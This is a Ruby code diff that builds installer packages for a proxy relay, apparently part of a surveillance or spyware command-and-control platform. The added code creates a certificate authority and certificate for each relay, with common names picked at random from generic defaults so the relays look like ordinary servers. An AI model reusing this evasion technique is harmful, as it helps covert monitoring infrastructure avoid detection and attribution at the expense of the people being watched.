@@ -21,14 +21,30 @@ class BuildAnon < Build
   def melt(params)
     trace :debug, "Build: melt #{params}"
 
-    # take the files needed for the communication with RNC
+    # generate a new anon cert
+    generate_anon_certificate
+
+    # take the files needed for the communication with NC
     Dir.mkdir path('bbproxy/etc')
-    FileUtils.cp Config.instance.cert('rcs-network.pem'), path('bbproxy/etc/certificate')
+    FileUtils.cp path('anon.pem'), path('bbproxy/etc/certificate')
     FileUtils.cp Config.instance.cert('rcs-network.sig'), path('bbproxy/etc/signature')
 
     # the local port to listen on
     File.open(path('managerport'), 'wb') {|f| f.write params['port']}
-    
+
+    # retrieve the current collector
+    coll = Collector.find(params['id'])
+    if coll.good == false
+      trace :warn, "Building an anonymizer with BAD status..."
+      # write a fake version that is BAD for the collector check
+      File.write(path('version'), "2014000000")
+    end
+
+    # write the anon config
+    File.write(path('nexthop'), coll.config)
+
+    trace :info, "Building anonymizer #{coll.address} with nexthop: #{coll.config}"
+
     # create the installer tar gz
     begin
       gz = Zlib::GzipWriter.new(File.open(path('install.tar.gz'), 'wb'))
@@ -47,6 +63,9 @@ class BuildAnon < Build
       Minitar::pack_file(h, output)
 
       h = {name: path('managerport'), as: 'bbproxy/etc/managerport'}
+      Minitar::pack_file(h, output)
+
+      h = {name: path('nexthop'), as: 'bbproxy/etc/nexthop'}
       Minitar::pack_file(h, output)
 
       h = {name: path('bbproxy/init.d/bbproxy'), as: 'bbproxy/init.d/bbproxy', mode: 0755}
@@ -84,6 +103,56 @@ class BuildAnon < Build
 
   def unique(core)
     # nothing to do here...
+  end
+
+  def random_ca_name
+    ['CA', 'ca', 'Root CA', 'root-ca', 'test-ca', 'test CA', 'my CA', 'ca_default'].sample
+  end
+
+  def random_name
+    ['server', 'test', 'apache', 'nginx', 'development', 'web', 'www', 'Common Name', 'default', 'acme'].sample
+  end
+
+  def generate_anon_certificate
+    trace :info, "Generating anon ssl certificates..."
+
+    FileUtils.cp Config.instance.cert('openssl.cnf'), path('openssl.cnf')
+
+    Dir.chdir path('') do
+
+      File.open('index.txt', 'wb+') { |f| f.write '' }
+      File.open('serial.txt', 'wb+') { |f| f.write '01' }
+
+      trace :info, "Generating a new Anon CA authority..."
+      subj = "/CN=\"#{random_ca_name}\""
+      out = `openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-anon-ca.key -out rcs-anon-ca.crt -config openssl.cnf 2>&1`
+      trace :debug, out
+
+      raise('Missing file rcs-anon-ca.crt') unless File.exist? 'rcs-anon-ca.crt'
+
+      trace :info, "Generating anonymizer certificate..."
+      subj = "/CN=\"#{random_name}\""
+      out = `openssl req -subj #{subj} -batch -days 3650 -nodes -new -keyout rcs-anon.key -out rcs-anon.csr -config openssl.cnf 2>&1`
+      trace :debug, out
+
+      raise('Missing file rcs-anon.key') unless File.exist? 'rcs-anon.key'
+      raise('Missing file rcs-anon.csr') unless File.exist? 'rcs-anon.csr'
+
+      trace :info, "Signing certificates..."
+      out = `openssl ca -batch -days 3650 -out rcs-anon.crt -in rcs-anon.csr -config openssl.cnf -name CA_network 2>&1`
+      trace :debug, out
+
+      raise('Missing file rcs-anon.crt') unless File.exist? 'rcs-anon.crt'
+
+      trace :info, "Creating certificates bundles..."
+
+      # create the PEM file for all the collectors
+      File.open('anon.pem', 'wb+') do |f|
+        f.write File.read('rcs-anon.crt')
+        f.write File.read('rcs-anon.key')
+        f.write File.read('rcs-anon-ca.crt')
+      end
+    end
   end
 
 end
